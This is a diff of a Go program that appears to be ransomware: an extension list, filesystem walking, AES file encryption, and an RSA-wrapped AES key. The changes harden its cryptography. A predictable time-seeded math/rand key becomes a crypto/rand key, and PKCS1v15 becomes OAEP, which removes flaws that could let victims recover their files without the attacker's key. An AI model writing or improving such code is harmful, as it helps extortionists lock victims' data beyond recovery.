@@ -5,17 +5,15 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/x509"
 	"encoding/pem"
 	"io"
 	"io/fs"
-	random "math/rand"
 	"os"
 	"path/filepath"
 	"slices"
-	"strconv"
 	"strings"
-	"time"
 )
 
 var EXT = []string{
@@ -58,7 +56,13 @@ func rsa_encode(aes_key []byte) error {
 		return err
 	}
 	//enc aes key
-	enc_aes_key, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, aes_key)
+	enc_aes_key, err := rsa.EncryptOAEP(
+		sha256.New(),
+		rand.Reader,
+		publicKey,
+		aes_key,
+		nil,
+	)
 	if err != nil {
 		return err
 	}
@@ -73,25 +77,14 @@ func rsa_encode(aes_key []byte) error {
 	return nil
 }
 
-func aes_password_generator() []byte {
-	chars := []string{"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "-", "+", "="}
-	for i := 65; i < 91; i++ {
-		chars = append(chars, string(rune(i)))
+func aes_password_generator() ([]byte, error) {
+	length := 32
+	password := make([]byte, length)
+	_, err := rand.Read(password)
+	if err != nil {
+		return []byte{}, err
 	}
-	for i := 97; i < 123; i++ {
-		chars = append(chars, string(rune(i)))
-	}
-	for i := 0; i < 10; i++ {
-		chars = append(chars, strconv.Itoa(i))
-	}
-	r := random.New(random.NewSource(time.Now().UnixNano()))
-	var aes_gen_password string
-	i := 0
-	for i < 32 {
-		aes_gen_password += string(chars[r.Intn(len(chars))])
-		i++
-	}
-	return []byte(aes_gen_password)
+	return password, nil
 }
 
 func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
@@ -183,7 +176,7 @@ func main() {
 		}
 	}
 
-	aes_gen_password := aes_password_generator()
+	aes_gen_password, _ := aes_password_generator()
 	rsa_encode(aes_gen_password)
 
 	done := make(chan bool)
